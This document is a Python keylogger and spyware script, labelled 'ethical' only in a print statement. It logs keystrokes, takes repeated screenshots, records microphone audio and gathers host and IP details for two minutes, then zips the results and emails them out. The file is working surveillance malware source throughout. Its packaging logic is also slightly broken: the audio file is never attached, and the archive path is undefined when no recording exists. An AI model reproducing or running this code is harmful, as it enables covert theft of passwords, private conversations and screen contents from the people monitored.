from pynput.keyboard import Key, Listener
import threading
import time
import os
from PIL import ImageGrab
from emailer import send_email
import platform
import socket
from requests import get
import sounddevice as sd
from scipy.io.wavfile import write
import psutil
import zipfile

# === CONFIG ===
LOG_DIR = os.path.expanduser("~") + "/Documents/KeyLogger/"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "keystroke_log.txt")
AUDIO_FILE = os.path.join(LOG_DIR, "audio.wav")
LOG_DURATION = 120  # ⏱️ Keylogger duration: 2 mins
keys = []

# === ZIP ATTACHMENTS ===
def zip_attachments(file_list, zip_name="logs.zip"):
    zip_path = os.path.join(LOG_DIR, zip_name)
    with zipfile.ZipFile(zip_path, "w") as zipf:
        for file in file_list:
            if os.path.exists(file):
                zipf.write(file, arcname=os.path.basename(file))
    print(f"📦 Zipped files to: {zip_path}")
    return zip_path

# === SYSTEM INFO ===
def get_system_info(path):
    info_file = os.path.join(path, "system_info.txt")
    try:
        with open(info_file, "w") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)

            try:
                public_ip = get("https://api.ipify.org").text
                f.write(f"Public IP Address: {public_ip}\n")
            except:
                f.write("Couldn't get Public IP Address\n")

            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP Address: {IPAddr}\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n\n")

            f.write("=== Resource Usage ===\n")
            f.write(f"CPU Usage: {psutil.cpu_percent()}%\n")
            f.write(f"Total RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB\n")
            f.write(f"Available RAM: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB\n")
            f.write(f"RAM Usage: {psutil.virtual_memory().percent}%\n")

            disk = psutil.disk_usage('/')
            f.write(f"Disk Total: {round(disk.total / (1024 ** 3), 2)} GB\n")
            f.write(f"Disk Used: {round(disk.used / (1024 ** 3), 2)} GB\n")
            f.write(f"Disk Free: {round(disk.free / (1024 ** 3), 2)} GB\n")
            f.write(f"Disk Usage: {disk.percent}%\n")

            battery = psutil.sensors_battery()
            if battery:
                f.write(f"Battery: {battery.percent}% {'(Plugged In)' if battery.power_plugged else '(On Battery)'}\n")
            else:
                f.write("Battery: Not available\n")

        print("💻 Extended system info captured.")
        return info_file

    except Exception as e:
        print(f"❌ Error collecting system info: {e}")
        return None

# === RECORD AUDIO ===
def record_audio(output_path, duration=120):  # 🎙️ 2 minutes
    try:
        fs = 44100
        print("🎙️ Recording audio for 120 seconds...")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        write(output_path, fs, recording)
        print(f"🎧 Audio saved to {output_path}")
        return output_path
    except Exception as e:
        print(f"❌ Audio recording failed: {e}")
        return None

# === SCREENSHOTS ===
def take_screenshots(folder, count=10, interval=12):  # 🖼️ 10 screenshots
    screenshots = []
    print(f"📸 Taking {count} screenshots every {interval} seconds...")
    for i in range(count):
        try:
            img = ImageGrab.grab()
            filename = os.path.join(folder, f"screenshot_{i+1}.png")
            img.save(filename)
            screenshots.append(filename)
            print(f"✅ Saved: {filename}")
            if i < count - 1:
                time.sleep(interval)
        except Exception as e:
            print(f"❌ Screenshot {i+1} failed: {e}")
    return screenshots

# === KEYLOGGER ===
def write_log(keys):
    with open(LOG_FILE, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k == "Key.space":
                f.write(" ")
            elif k == "Key.enter":
                f.write("\n")
            elif k == "Key.backspace":
                f.write("[BACKSPACE]")
            elif "Key" not in k:
                f.write(k)

def on_press(key):
    keys.append(key)
    if len(keys) >= 1:
        write_log(keys)
        keys.clear()

def on_release(key):
    if key == Key.esc:
        return False

# === MAIN LOGGER FUNCTION ===
def start_keylogger():
    print("🛡️ Ethical Keylogger started (2 mins)")

    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    screenshots = []

    def run_screenshots():
        nonlocal screenshots
        screenshots = take_screenshots(LOG_DIR, count=10, interval=12)

    def run_audio():
        record_audio(AUDIO_FILE, duration=120)

    screenshot_thread = threading.Thread(target=run_screenshots)
    audio_thread = threading.Thread(target=run_audio)

    screenshot_thread.start()
    audio_thread.start()

    time.sleep(LOG_DURATION)
    listener.stop()
    listener.join()

    screenshot_thread.join()
    audio_thread.join()

    sys_info_file = get_system_info(LOG_DIR)

    attachments = [LOG_FILE] + screenshots
    if sys_info_file:
        attachments.append(sys_info_file)
    if os.path.exists(AUDIO_FILE):

      zip_path = zip_attachments(attachments)
    send_email([zip_path])

# === ENTRY POINT ===
if __name__ == "__main__":
    start_keylogger()
